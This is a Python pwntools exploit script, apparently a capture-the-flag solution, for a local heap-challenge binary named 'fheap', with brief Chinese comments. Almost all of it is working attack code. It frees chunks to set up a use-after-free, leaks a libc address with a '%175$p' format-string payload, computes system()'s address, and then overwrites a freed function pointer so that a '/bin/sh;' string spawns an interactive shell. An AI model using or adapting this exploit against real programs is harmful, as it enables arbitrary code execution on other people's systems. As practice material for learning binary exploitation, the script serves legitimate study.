#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./fheap')
# libc = ELF('libc.so.6')
libc = elf.libc
p=process('./fheap')

def create(size, s):
    p.recvuntil('quit\n')
    p.sendline('create ')
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('str:')
    p.send(s)

def delete(index):
    p.recvuntil('quit\n')
    p.sendline('delete ')
    p.recvuntil('id:')
    p.sendline(str(index))
    p.recvuntil('sure?:')
    p.sendline('yes')

def debug():
    gdb.attach(p)
    pause()

create(10,'012345678\x00')# 0 10
create(10,'012345678\x00')# 1 10
# create(10,'0123456789')# 2 10

# delete(2)
delete(1)

delete(0)

create(0x20, b'%175$p' + b'1'*(24-6) + b'\xd0\x09\x00')# 0 0x30 没有 \x00 截断，就会发生魔法，跟 strncpy 有关 覆盖四位的话就要爆破了
# debug()
delete(1)

# p.recvuntil('1'*(24-6))
__libc_start_main_addr = int(p.recv(14)[2:],16) - 243
log.success('__libc_start_main_addr: ' + hex(__libc_start_main_addr))

system_addr = __libc_start_main_addr + 0x2e450
log.success('system_addr: ' + hex(system_addr))# 用 vmmap 和 p 指令查就完事



delete(0)

create(0x20, b'/bin/sh;' + b'1'*(24-8) + p64(system_addr))# 0 0x30 没有 \x00 截断，就会发生魔法，跟 strncpy 有关 覆盖四位的话就要爆破了
delete(1)

p.interactive()